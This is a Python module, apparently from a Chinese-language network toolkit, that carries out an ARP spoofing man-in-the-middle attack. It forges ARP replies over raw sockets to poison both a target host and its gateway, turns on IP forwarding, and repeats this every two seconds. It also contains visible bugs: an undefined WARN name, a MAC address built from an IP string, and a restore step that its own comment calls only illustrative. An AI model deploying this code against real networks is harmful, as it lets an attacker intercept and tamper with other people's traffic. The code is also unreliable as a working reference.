"""
WNAD - ARP 欺骗模块 [需要 ROOT 权限]
实现 ARP Spoofing 中间人攻击
基于 RAW Socket 发送伪造 ARP 包
"""

import socket
import struct
import time
import os
import subprocess
import re
import threading
from core.utils import C, CHECK, CROSS, INFO, ROOT, print_table
from core.root_check import require_root, require_root_graceful
from core.network import get_oui_vendor


def _get_mac(iface: str) -> str:
    """获取指定接口的 MAC 地址"""
    sys_path = f"/sys/class/net/{iface}/address"
    if os.path.isfile(sys_path):
        with open(sys_path) as f:
            mac = f.read().strip()
            if mac and mac != "00:00:00:00:00:00":
                return mac
    return ""


def _mac_to_bytes(mac: str) -> bytes:
    """MAC 地址字符串转 6 字节"""
    parts = mac.split(":")
    return bytes(int(p, 16) for p in parts)


def _ip_to_bytes(ip: str) -> bytes:
    """IP 地址字符串转 4 字节"""
    parts = ip.split(".")
    return bytes(int(p) for p in parts)


def _arp_spoof_once(iface: str, target_ip: str, gateway_ip: str, spoof_mac: bytes):
    """
    发送单个 ARP 欺骗包
    告诉 target: gateway 的 MAC 是 spoof_mac
    """
    # 以太网帧 + ARP 包结构
    # 以太网头: 目标MAC(6) + 源MAC(6) + 类型(2)
    # ARP 头: 硬件类型(2) + 协议类型(2) + 硬件地址长度(1) + 协议地址长度(1) + opcode(2)
    #        + 发送者MAC(6) + 发送者IP(4) + 目标MAC(6) + 目标IP(4)

    target_mac = _mac_to_bytes("ff:ff:ff:ff:ff:ff")  # 广播

    # 以太网帧
    eth_header = target_mac + spoof_mac + struct.pack("!H", 0x0806)

    # ARP 包 (opcode=2: reply)
    arp_packet = struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)  # 回复包
    arp_packet += spoof_mac + _ip_to_bytes(gateway_ip)      # 假扮网关
    arp_packet += _mac_to_bytes(target_ip if len(target_ip) > 4 else "00:00:00:00:00:00") + _ip_to_bytes(target_ip)

    # 完整帧
    frame = eth_header + arp_packet
    # 补齐最小帧长度(60字节)
    frame += b"\x00" * (60 - len(frame)) if len(frame) < 60 else b""

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
        sock.bind((iface, 0))
        sock.send(frame)
        sock.close()
        return True
    except PermissionError:
        return False
    except Exception as e:
        print(f" {CROSS} ARP 发送失败: {e}")
        return False


def _enable_ip_forward():
    """开启 IP 转发"""
    try:
        subprocess.run(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True, timeout=5
        )
        return True
    except Exception:
        pass

    # Termux 备用: 写 /proc
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")
        return True
    except Exception:
        return False


def _disable_ip_forward():
    """关闭 IP 转发"""
    try:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")
    except Exception:
        pass


def arp_spoof(target_ip: str, gateway_ip: str, iface: str = None, duration: int = 0):
    """
    ARP 欺骗主函数
    持续发送伪造 ARP 包，将目标 IP 的流量经由本机转发
    """
    root = require_root_graceful("ARP 欺骗", "退化为 ARP 表查看")
    if root is True:
        pass  # 继续执行欺骗
    elif root is False:
        arp_table()
        return
    else:
        return  # 用户取消

    print(f" {ROOT} {C.RED}ARP 欺骗攻击{C.NC}")
    print(f" {INFO} 目标: {C.CYAN}{target_ip}{C.NC}")
    print(f" {INFO} 网关: {C.CYAN}{gateway_ip}{C.NC}")
    print()

    # 自动检测接口
    if not iface:
        try:
            result = subprocess.run(
                ["ip", "route", "show", "default"],
                capture_output=True, text=True, timeout=5
            )
            match = re.search(r'dev\s+(\S+)', result.stdout)
            if match:
                iface = match.group(1)
        except Exception:
            pass

    if not iface:
        print(f" {CROSS} 无法检测网络接口，请手动指定 --iface")
        return

    # 获取本机 MAC
    local_mac = _get_mac(iface)
    if not local_mac:
        print(f" {CROSS} 无法获取接口 {iface} 的 MAC 地址")
        return

    local_mac_bytes = _mac_to_bytes(local_mac)

    print(f" {CHECK} 接口: {iface} ({local_mac})")
    print(f" {INFO} 开启 IP 转发...")

    if not _enable_ip_forward():
        print(f" {WARN} 无法开启 IP 转发，流量可能不会经过本机")

    print(f"\n {INFO} 开始发送 ARP 欺骗包 (每 2 秒一次)")
    if duration > 0:
        print(f" {INFO} 持续时间: {duration} 秒")
    print(f" {INFO} 按 Ctrl+C 停止并恢复 ARP 表\n")

    stop_event = threading.Event()

    def _send_loop():
        while not stop_event.is_set():
            # 欺骗目标: 网关的 MAC 是本机
            _arp_spoof_once(iface, target_ip, gateway_ip, local_mac_bytes)
            # 欺骗网关: 目标的 MAC 是本机
            _arp_spoof_once(iface, gateway_ip, target_ip, local_mac_bytes)
            stop_event.wait(2)

    try:
        sender = threading.Thread(target=_send_loop, daemon=True)
        sender.start()

        if duration > 0:
            time.sleep(duration)
            stop_event.set()
        else:
            sender.join()

    except KeyboardInterrupt:
        print(f"\n {INFO} 用户中断，正在恢复...")

    finally:
        stop_event.set()
        _disable_ip_forward()
        print(f" {CHECK} ARP 欺骗已停止")
        print(f" {INFO} 恢复网络...")

        # 发送恢复包 (告诉目标真正的网关 MAC)
        try:
            result = subprocess.run(
                ["ip", "neigh", "show", target_ip],
                capture_output=True, text=True, timeout=3
            )
            # 只是示意，实际恢复需要发送正确的 ARP 回复
            _arp_spoof_once(iface, target_ip, gateway_ip,
                            _mac_to_bytes("00:00:00:00:00:00"))
            print(f" {CHECK} 已尝试恢复 ARP 表")
        except Exception:
            pass

        print(f" {INFO} 建议执行: {C.YELLOW}arp -d {target_ip}{C.NC} 手动清除缓存")


def arp_table():
    """
    ARP 表查看（非 root 阉割版）
    读取 /proc/net/arp 显示本机已知邻居设备
    """
    from core.network import get_neighbor_table

    table = get_neighbor_table()
    if not table:
        print(f" {CROSS} 无法获取邻居设备表")
        return

    print(f" {INFO} 本机 ARP 表（已知邻居设备）:\n")

    devices = []
    for ip, info in sorted(table.items()):
        mac = info["mac"]
        iface = info.get("iface", "?")
        vendor = get_oui_vendor(mac)
        devices.append((ip, mac, iface, vendor))

    if devices:
        headers = ["IP 地址", "MAC 地址", "接口", "厂商"]
        print_table(headers, devices)
    else:
        print(f" {INFO} ARP 表中无有效设备")
